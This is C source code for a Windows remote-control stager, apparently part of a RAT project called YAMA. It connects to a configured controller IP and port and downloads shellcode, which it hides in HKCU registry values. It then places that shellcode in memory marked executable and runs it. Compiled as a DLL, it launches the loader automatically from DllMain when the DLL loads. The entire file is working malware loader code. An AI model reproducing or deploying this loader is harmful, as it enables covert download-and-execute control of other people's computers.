#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#include <winsock2.h>
#include <ws2tcpip.h>
#include <time.h>
#include <assert.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include "../common/hash.h"

#ifdef _DEBUG
#define Mprintf printf
#define IsRelease 0
#else
#define Mprintf(format, ...)
#define IsRelease 1
#endif

#pragma comment(lib, "ws2_32.lib")

#pragma pack(push, 4)
typedef struct PkgHeader {
    char flag[8];
    int totalLen;
    int originLen;
} PkgHeader;

struct CONNECT_ADDRESS {
    char	        szFlag[32];		 // 标识
    char			szServerIP[100]; // 主控IP
    char			szPort[8];		 // 主控端口
    int				iType;			 // 客户端类型
    bool            bEncrypt;		 // 上线信息是否加密
    char            szBuildDate[12]; // 构建日期(版本)
    int             iMultiOpen;		 // 支持打开多个
    int				iStartup;		 // 启动方式
    int				iHeaderEnc;		 // 数据加密类型
    char			protoType;		 // 协议类型
    char			runningType;	 // 运行方式
    char			szGroupName[24]; // 分组名称
    char            runasAdmin;      // 是否提升权限运行
    char            szReserved[11];  // 占位，使结构体占据300字节
    uint64_t        clientID;        // 客户端唯一标识
    uint64_t		parentHwnd;		 // 父进程窗口句柄
    uint64_t		superAdmin;		 // 管理员主控ID
    char			pwdHash[64];	 // 密码哈希
} g_Server = { "Hello, World!", "127.0.0.1", "6543", 0, 0, __DATE__ };
#pragma pack(pop)

typedef struct PluginParam {
    char IP[100];
    int Port;
    void* Exit;
    void* User;
} PluginParam;

PkgHeader MakePkgHeader(int originLen)
{
    PkgHeader header = { 0 };
    memcpy(header.flag, "Hello?", 6);
    header.originLen = originLen;
    header.totalLen = sizeof(PkgHeader) + originLen;
    return header;
}

int GetIPAddress(const char* hostName, char* outIpBuffer, int bufferSize)
{
    struct sockaddr_in sa = { 0 };
    if (inet_pton(AF_INET, hostName, &(sa.sin_addr)) == 1) {
        strncpy(outIpBuffer, hostName, bufferSize - 1);
        outIpBuffer[bufferSize - 1] = '\0';
        return 0;
    }

    struct addrinfo hints = { 0 };
    struct addrinfo* res = NULL;
    hints.ai_family = AF_INET;  // IPv4 only
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    if (getaddrinfo(hostName, NULL, &hints, &res) != 0 || res == NULL) {
        return -1;
    }

    struct sockaddr_in* ipv4 = (struct sockaddr_in*)res->ai_addr;
    if (inet_ntop(AF_INET, &(ipv4->sin_addr), outIpBuffer, bufferSize) == NULL) {
        freeaddrinfo(res);
        return -2;
    }

    freeaddrinfo(res);
    return 0;
}

bool WriteRegistryString(const char* path, const char* keyName, const char* value)
{
    HKEY hKey;
    LONG result = RegCreateKeyExA(HKEY_CURRENT_USER, path, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL);
    if (result != ERROR_SUCCESS) {
        return false;
    }
    result = RegSetValueExA(hKey, keyName, 0, REG_SZ, (const BYTE*)value, (DWORD)(strlen(value) + 1));

    RegCloseKey(hKey);
    return result == ERROR_SUCCESS;
}

char* ReadRegistryString(const char* subKey, const char* valueName)
{
    HKEY hKey = NULL;
    LONG ret = RegOpenKeyExA(HKEY_CURRENT_USER, subKey, 0, KEY_READ, &hKey);
    if (ret != ERROR_SUCCESS)
        return NULL;

    DWORD dataType = 0;
    DWORD dataSize = 1024;
    char* data = (char*)malloc(dataSize + 1);
    if (data) {
        ret = RegQueryValueExA(hKey, valueName, NULL, &dataType, (LPBYTE)data, &dataSize);
        data[min(dataSize, 1024)] = '\0';
        if (ret != ERROR_SUCCESS || (dataType != REG_SZ && dataType != REG_EXPAND_SZ)) {
            free(data);
            data = NULL;
        }
    }
    RegCloseKey(hKey);

    return data;
}

bool WriteAppSettingBinary(const char* path, const char* keyName, const void* data, DWORD dataSize)
{
    HKEY hKey;
    LONG result = RegCreateKeyExA(HKEY_CURRENT_USER, path, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL);
    if (result != ERROR_SUCCESS) {
        return false;
    }
    result = RegSetValueExA(hKey, keyName, 0, REG_BINARY, (const BYTE*)data, dataSize);

    RegCloseKey(hKey);
    return result == ERROR_SUCCESS;
}

bool ReadAppSettingBinary(const char* path, const char* keyName, BYTE* outDataBuf, DWORD* dataSize)
{
    HKEY hKey;
    LONG result = RegOpenKeyExA(HKEY_CURRENT_USER, path, 0, KEY_READ, &hKey);
    if (result != ERROR_SUCCESS) {
        *dataSize = 0;
        return false;
    }

    DWORD type = 0;
    DWORD requiredSize = 0;
    result = RegQueryValueExA(hKey, keyName, NULL, &type, NULL, &requiredSize);
    if (result != ERROR_SUCCESS || type != REG_BINARY || requiredSize == 0 || requiredSize > *dataSize) {
        *dataSize = 0;
        RegCloseKey(hKey);
        return false;
    }

    result = RegQueryValueExA(hKey, keyName, NULL, NULL, outDataBuf, &requiredSize);
    RegCloseKey(hKey);
    if (result == ERROR_SUCCESS) {
        *dataSize = requiredSize;
        return true;
    }

    *dataSize = 0;
    return false;
}

#define MD5_DIGEST_LENGTH 16
const char* CalcMD5FromBytes(const BYTE* data, DWORD length)
{
    static char md5String[MD5_DIGEST_LENGTH * 2 + 1]; // 32 hex chars + '\0'
    if (data == NULL || length == 0) {
        memset(md5String, 0, sizeof(md5String));
        return md5String;
    }
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    BYTE hash[MD5_DIGEST_LENGTH];
    DWORD hashLen = sizeof(hash);

    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
        return NULL;
    }

    if (!CryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash)) {
        CryptReleaseContext(hProv, 0);
        return NULL;
    }

    if (!CryptHashData(hHash, data, length, 0)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return NULL;
    }

    if (!CryptGetHashParam(hHash, HP_HASHVAL, hash, &hashLen, 0)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return NULL;
    }

    // 转换为十六进制字符串
    for (DWORD i = 0; i < hashLen; ++i) {
        sprintf(&md5String[i * 2], "%02x", hash[i]);
    }
    md5String[MD5_DIGEST_LENGTH * 2] = '\0';

    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
    return md5String;
}

const char* ReceiveShellcode(const char* sIP, int serverPort, int* sizeOut)
{
    if (!sIP || !sizeOut) return NULL;

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
        return NULL;

    char addr[100] = { 0 }, hash[33] = { 0 };
    strcpy(addr, sIP);
    BOOL isAuthKernel = FALSE;
    char eventName[64];
    snprintf(eventName, sizeof(eventName), "YAMA_%d", GetCurrentProcessId());
    HANDLE hEvent = OpenEventA(SYNCHRONIZE, FALSE, eventName);
    if (hEvent) {
        CloseHandle(hEvent);
        isAuthKernel = TRUE;
    }
    const char* path = isAuthKernel ? "Software\\YAMA\\auth" : "Software\\ServerD11\\settings";
    char* saved_ip = ReadRegistryString(path, "master");
    char* saved_port = ReadRegistryString(path, "port");
    char* valid_to = ReadRegistryString(path, "valid_to");
    char* md5 = ReadRegistryString(path, "version");
    memcpy(hash, md5, md5 ? min(32, strlen(md5)) : 0);
    int now = time(NULL), valid = valid_to ? atoi(valid_to) : 0;
    if (now <= valid && saved_ip && *saved_ip && saved_port && *saved_port) {
        strcpy(addr, saved_ip);
        serverPort = atoi(saved_port);
    }
    free(saved_ip);
    saved_ip = NULL;
    free(saved_port);
    saved_port = NULL;
    free(valid_to);
    valid_to = NULL;
    free(md5);
    md5 = NULL;

    char serverIP[INET_ADDRSTRLEN] = { 0 };
    if (GetIPAddress(addr, serverIP, sizeof(serverIP)) == 0) {
        Mprintf("Resolved IP: %s\n", serverIP);
    } else {
        Mprintf("Failed to resolve '%s'.\n", addr);
        WSACleanup();
        return NULL;
    }

    srand(time(NULL));
    const int bufSize = (8 * 1024 * 1024);
    char* buffer = NULL;
    BOOL isFirstConnect = TRUE;
    int attemptCount = 0, requestCount = 0;
    do {
        if (!isFirstConnect)
            Sleep(IsRelease ? rand() % 120 * 1000 : 5000);
        isFirstConnect = FALSE;
        if (++attemptCount == 20)
            PostMessage((HWND)g_Server.parentHwnd, 4046, (WPARAM)933711587, (LPARAM)1643138518);
        Mprintf("Connecting attempt #%d -> %s:%d \n", attemptCount, serverIP, serverPort);

        SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (clientSocket == INVALID_SOCKET)
            continue;

        DWORD timeout = 30000;
        setsockopt(clientSocket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));

        struct sockaddr_in serverAddr = { 0 };
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port = htons(serverPort);
        serverAddr.sin_addr.s_addr = inet_addr(serverIP);
        if (connect(clientSocket, (SOCKADDR*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
            closesocket(clientSocket);
            SetThreadExecutionState(ES_CONTINUOUS | ES_SYSTEM_REQUIRED);
            continue;
        }

        char command[64] = { 210, sizeof(void*) == 8, 0, IsRelease, __DATE__ };
        char req[sizeof(PkgHeader) + sizeof(command)] = { 0 };
        memcpy(command + 32, hash, 32);
        PkgHeader h = MakePkgHeader(sizeof(command));
        memcpy(req, &h, sizeof(PkgHeader));
        memcpy(req + sizeof(PkgHeader), command, sizeof(command));
        int bytesSent = send(clientSocket, req, sizeof(req), 0);
        if (bytesSent != sizeof(req)) {
            closesocket(clientSocket);
            continue;
        }

        int totalReceived = 0;
        buffer = buffer ? buffer : (char*)malloc(bufSize);
        if (!buffer) {
            closesocket(clientSocket);
            continue;
        }
        if (requestCount < 3) {
            requestCount++;
            const int bufferSize = 16 * 1024;
            time_t tm = time(NULL);
            while (totalReceived < bufSize) {
                int bytesToReceive = (bufferSize < bufSize - totalReceived) ? bufferSize : (bufSize - totalReceived);
                int bytesReceived = recv(clientSocket, buffer + totalReceived, bytesToReceive, 0);
                if (bytesReceived <= 0) {
                    Mprintf("recv failed: WSAGetLastError = %d\n", WSAGetLastError());
                    break;
                }
                totalReceived += bytesReceived;
                if (totalReceived >= sizeof(PkgHeader) && totalReceived >= ((PkgHeader*)buffer)->totalLen) {
                    Mprintf("recv succeed: Cost time = %d s\n", (int)(time(NULL) - tm));
                    break;
                }
            }
        } else {
            closesocket(clientSocket);
            break;
        }

        PkgHeader* header = (PkgHeader*)buffer;
        if (totalReceived != header->totalLen || header->originLen <= 6 || header->totalLen > bufSize) {
            Mprintf("Packet too short or too large: totalReceived = %d\n", totalReceived);
            closesocket(clientSocket);
            if (hash[0])break;
            continue;
        }
        unsigned char* ptr = buffer + sizeof(PkgHeader);
        int size = 0;
        BYTE cmd = ptr[0], type = ptr[1];
        memcpy(&size, ptr + 2, sizeof(int));
        *sizeOut = size;
        if (cmd != 211 || (type != 0 && type != 1) || size <= 64 || size > bufSize) {
            closesocket(clientSocket);
            break;
        }
        closesocket(clientSocket);
        WSACleanup();
        const char* md5 = CalcMD5FromBytes((BYTE*)buffer + 22, size);
        WriteAppSettingBinary(path, "data", buffer, 22 + size);
        WriteRegistryString(path, "version", md5);
        return buffer;
    } while (1);

    WSACleanup();
    buffer = buffer ? buffer : (char*)malloc(bufSize);
    DWORD binSize = bufSize;
    if (ReadAppSettingBinary(path, "data", buffer, &binSize)) {
        *sizeOut = binSize - 22;
        const char* md5 = CalcMD5FromBytes((BYTE*)buffer + 22, *sizeOut);
        if (strcmp(md5, hash) == 0) {
            Mprintf("Read data from registry succeed: %d bytes\n", *sizeOut);
            return buffer;
        }
    }
    // Registry data is incorrect
    WriteRegistryString(path, "version", "");
    free(buffer);
    return NULL;
}

inline int MemoryFind(const char* szBuffer, const char* Key, int iBufferSize, int iKeySize)
{
    for (int i = 0; i <= iBufferSize - iKeySize; ++i) {
        if (0 == memcmp(szBuffer + i, Key, iKeySize)) {
            return i;
        }
    }
    return -1;
}

#ifdef _WINDLL
#define DLL_API __declspec(dllexport)
#else
#define DLL_API
#endif

extern DLL_API DWORD WINAPI run(LPVOID param)
{
    char eventName[64] = { 0 };
    sprintf(eventName, "EVENT_%d", GetCurrentProcessId());
    HANDLE hEvent = CreateEventA(NULL, TRUE, FALSE, eventName);
    PluginParam* info = (PluginParam*)param;
    int size = 0;
    const char* dllData = ReceiveShellcode(info->IP, info->Port, &size);
    if (dllData == NULL) return -1;
    void* execMem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (NULL == execMem) return -2;
    int offset = MemoryFind(dllData, MASTER_HASH, size, sizeof(MASTER_HASH) - 1);
    if (offset != -1) {
        memcpy(dllData + offset, info->User, 64);
    }
    memcpy(execMem, dllData + 22, size);
    free((void*)dllData);
    DWORD oldProtect = 0;
    if (!VirtualProtect(execMem, size, PAGE_EXECUTE_READ, &oldProtect)) return -3;
    PostMessage((HWND)g_Server.parentHwnd, 4046, (WPARAM)0, (LPARAM)0);
    ((void(*)())execMem)();
    return 0;
}

extern DLL_API void Run(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
    assert(sizeof(struct CONNECT_ADDRESS) == 300);
    PluginParam param = { 0 };
    strcpy(param.IP, g_Server.szServerIP);
    param.Port = atoi(g_Server.szPort);
    param.User = g_Server.pwdHash;
    DWORD result = run(&param);
    Sleep(INFINITE);
}

#ifndef _WINDLL

int main()
{
    Run(0, 0, 0, 0);
    return 0;
}

#else

BOOL APIENTRY DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    static HANDLE threadHandle = NULL;
    if (fdwReason == DLL_PROCESS_ATTACH) {
        static PluginParam param = { 0 };
        strcpy(param.IP, g_Server.szServerIP);
        param.Port = atoi(g_Server.szPort);
        param.User = g_Server.pwdHash;
        threadHandle = CreateThread(NULL, 0, run, &param, 0, NULL);
    } else if (fdwReason == DLL_PROCESS_DETACH) {
        if (threadHandle) TerminateThread(threadHandle, 0x20250619);
    }
    return TRUE;
}

#endif
